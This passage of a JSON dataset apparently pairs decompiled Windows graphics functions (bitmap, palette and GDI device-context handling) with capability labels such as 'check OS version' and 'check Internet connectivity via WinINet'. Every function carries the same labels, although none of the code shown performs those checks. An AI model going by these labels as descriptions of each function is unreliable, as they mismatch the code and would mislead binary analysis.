        "decompiled_code": "\nvoid __fastcall fcn.00421c7c(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x421c9d;\n    var_4h = param_2;\n    fcn.0041d8d8();\n    uStack48 = 0x421ca4;\n    fcn.0042220c();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x421cc3;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x421cd2;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x421ce4;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x421cf3;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.00421c7c::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x421d26;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x421d34;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.00421c7c::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 0x421d55;\n        cVar2 = fcn.00422008();\n        if (cVar2 == '\\0') {\n            puStack80 = 0x3;\n            uStack84 = 0x421d63;\n            uStack84 = fcn.0041d804();\n            puStack88 = 0x421d69;\n            sub.gdi32.dll_SetStretchBltMode();\n        }\n    }\n    uStack92 = 0x421eb8;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    puStack100 = 0x421d7e;\n    puStack88 = &stack0xfffffffc;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        puStack100 = 0x421d89;\n        fcn.004221ac();\n    }\n    puStack100 = 0x421d90;\n    fcn.00421f4c();\n    puStack100 = 0x421d9b;\n    fcn.0041d8d8();\n    puStack100 = 0x421da2;\n    cVar2 = (**(*in_EAX + 0x28))();\n    if (cVar2 != '\\0') {\n        uStack104 = 0x421e4d;\n        uStack108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStack100 = &stack0xfffffffc;\n        sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar3 = fcn.0041dbfc();\n        iVar4 = sub.gdi32.dll_SelectObject(iVar3, *(iVar6 + 0xc));\n        arg_2ch = param_1[2] - *param_1;\n        arg_28h = param_1[3] - param_1[1];\n        iVar5 = fcn.00421f4c();\n        uVar7 = 0;\n        fcn.0041dda0(0, 0, iVar3, *(iVar6 + 0x20), *(iVar6 + 0x1c), 0, 0, *(iVar5 + 4), arg_28h, arg_2ch);\n        *in_FS_OFFSET = uVar7;\n        if (iVar4 != 0) {\n            sub.gdi32.dll_SelectObject(iVar3, iVar4, 0x421e92);\n        }\n        if (iVar3 != 0) {\n            sub.gdi32.dll_DeleteDC(iVar3);\n        }\n        return;\n    }\n    puStack100 = *(var_4h + 0x20);\n    uStack104 = *(iVar6 + 0x20);\n    uStack108 = *(iVar6 + 0x1c);\n    iVar6 = fcn.00421f4c(0, 0);\n    uVar7 = *(var_4h + 4);\n    sub.gdi32.dll_StretchBlt(uVar7, *param_1, param_1[1], param_1[2] - *param_1, param_1[3] - param_1[1], *(iVar6 + 4));\n    *in_FS_OFFSET = uVar7;\n    if (var_9h != '\\0') {\n        sub.gdi32.dll_SelectPalette(*(var_4h + 4), var_8h, 0xffffffff, 0x421ebf);\n    }\n    return;\n}\n",
        "token_count": 1586
    },
    "00421ecc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00421ecc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (1 < *(iVar1 + 4)) {\n        fcn.0042210c();\n        fcn.00421b18(iVar1 + 0x18);\n        return;\n    }\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 8) != *(iVar1 + 0x14))) {\n        if ((*(iVar1 + 0x14) != 0) && (iVar2 = sub.gdi32.dll_DeleteObject(*(iVar1 + 0x14)),  iVar2 == 0)) {\n            fcn.0041db54();\n        }\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x2c) = 0;\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "00421f4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00421f4c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0xb] == 0) {\n        fcn.0042210c();\n        if (in_EAX[0xb] == 0) {\n            iVar1 = fcn.00420ce8();\n            in_EAX[0xb] = iVar1;\n            *(iVar1 + 0x2c) = in_EAX;\n            *(iVar1 + 0x28) = *(*in_EAX + 0x10);\n            *(iVar1 + 0x34) = in_EAX;\n            *(iVar1 + 0x30) = fcn.00421bd8;\n        }\n    }\n    return in_EAX[0xb];\n}\n",
        "token_count": 180
    },
    "00421fb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00421fb8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    unkbyte3 Var3;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    Var3 = iVar1 >> 8;\n    if ((*(iVar1 + 8) == 0) || (*(iVar1 + 8) == *(iVar1 + 0x14))) {\n        if (*(iVar1 + 0x14) != 0) {\n            return 0;\n        }\n        if (*(iVar1 + 0x30) == 0) {\n            uVar2 = CONCAT31(Var3, 1);\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = CONCAT31(Var3, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "00422088": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00422088(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) != 0) && (*(iVar1 + 0x14) == 0)) {\n        fcn.0042220c();\n        if (*(iVar1 + 0x30) == 0) {\n            sub.gdi32.dll_GetObjectA(*(iVar1 + 8), 0x54, iVar1 + 0x18);\n            *(iVar1 + 0x30) = 0x28;\n            *(iVar1 + 0x34) = *(iVar1 + 0x1c);\n            *(iVar1 + 0x38) = *(iVar1 + 0x20);\n            *(iVar1 + 0x3c) = 1;\n            *(iVar1 + 0x3e) = *(iVar1 + 0x28) * *(iVar1 + 0x2a);\n        }\n        uVar2 = fcn.004210b0(0, iVar1 + 0x18);\n        *(iVar1 + 0x14) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "0042210c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042210c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY40;\n    uint uStackY36;\n    uchar *puStackY32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (((*(iVar1 + 8) == 0) && (*(iVar1 + 0x14) == 0)) && (*(iVar1 + 0x6c) != 0)) {\n        puStackY32 = 0x422139;\n        fcn.004157dc(0, 0);\n        iVar1 = in_EAX[4];\n        iVar2 = in_EAX[5];\n        uStackY36 = 0x42218f;\n        uStackY40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        in_EAX[4] = 0;\n        in_EAX[5] = 0;\n        puStackY32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x54))();\n        *in_FS_OFFSET = uStackY40;\n        in_EAX[4] = iVar1;\n        in_EAX[5] = iVar2;\n        return;\n    }\n    iVar1 = in_EAX[10];\n    if (*(iVar1 + 8) == 0) {\n        *(iVar1 + 8) = *(iVar1 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "004221ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004221ac(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.00420c6c();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.004220fc();\n        fcn.0042210c();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.00422038();\n        uVar2 = fcn.00421778();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "0042220c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042220c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.00420c6c();\n    }\n    iVar2 = fcn.0041e2ec();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.0041dbfc();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x0042229d;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x0042229d:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "004222c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004222c4(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.0041dac4();\n    }\n    fcn.004220fc();\n    fcn.00402c64();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.00421b18(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 236
    },
    "004223cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004223cc(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4223e8;\n    iVar1 = fcn.00403228();\n    puStack32 = 0x422453;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x422443;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.00403408();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4638a8;\n    puStack32 = 0x422474;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack36 = 0x4224b3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00420ee0();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.00420edc();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4224ba;\n    uStack36 = 0x4638a8;\n    uStack40 = 0x4224b2;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 576
    },
    "004224f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004224f4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x422527;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x42254c;\n    piVar1 = fcn.004026bc();\n    uStack196 = 0x422a11;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x4229e4;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00402c64();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00403228();\n            if (arg_8h == 0) {\n                fcn.00402c64();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42267a;\n            fcn.00415a58(in_ECX - var_20h, 0);\n            uStack224 = 0x42268a;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.0041dadc();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.004159e8();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.0041dd6c();\n        piVar1[8] = iVar2;\n    }\n    fcn.004159e8();\n    if (piVar1[5] == 0) {\n        iVar2 = fcn.0041dd8c();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.0041e034();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.0041dbfc();\n    uStack224 = 0x42295f;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x461444 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.004224f4::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x4228e5;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x4228f9;\n            iVar2 = sub.kernel32.dll_GetLastError();\n            if (iVar2 == 0) {\n                puStack256 = 0x422902;\n                fcn.0041dadc();\n            }\n            else {\n                puStack256 = 0x422909;\n                fcn.0040c9c0();\n            }\n        }\n        uStack260 = 0x42292e;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x422924;\n        puStack256 = &stack0xfffffffc;\n        fcn.004159e8();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x422966;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42295e;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x4227a1;\n    lpbInit = fcn.004026bc();\n    uStack236 = 0x4228c7;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x4227bf;\n    puStack232 = &stack0xfffffffc;\n    fcn.004159e8();\n    uStack244 = hdc;\n    piStack248 = 0x4227c8;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x4227cd;\n    var_10h = fcn.0041dbfc();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x4227dd;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x4227e7;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x422805;\n        uStack272 = fcn.0041e2ec();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x422817;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x422823;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42289b;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError();\n        if (iVar2 == 0) {\n            fcn.0041dadc();\n        }\n        else {\n            fcn.0040c9c0();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x4228a2);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2141
    },
    "00422f1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422f1c(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00402c64();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.00422088();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.0041ea40(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00402c64(cVar5 + cStack1080 + '\\x0e');\n            fcn.00421f4c();\n            fcn.0041d8d8();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.0041dbfc();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.0041e390(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.00415a20();\n        }\n        if (iStackY1120 != 0) {\n            fcn.00421064();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.0041e06c();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.00415a20();\n                fcn.00415a20();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.00415a20();\n                }\n            }\n            else {\n                fcn.00415a20();\n                fcn.00415a20();\n            }\n            fcn.00415a20();\n            fcn.00415a20();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.00415a20(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 965
    },
    "0042343c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042343c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.004157dc(0, 0);\n        uStack32 = 0x42346b;\n        fcn.004159e8();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.0041e63c(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x4234a7;\n                fcn.0041dae8();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "004234b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004234b4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x4234d7;\n            fcn.0041dae8();\n        }\n        puStack32 = 0x4234e3;\n        uVar2 = fcn.00403228();\n        uStack36 = 0x423541;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.00423400();\n        if (iVar3 == *0x4638a4) {\n            fcn.00402c64();\n            fcn.00415a20();\n        }\n        else {\n            fcn.00423400();\n            fcn.0041eb80();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 315
    },
    "004237fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
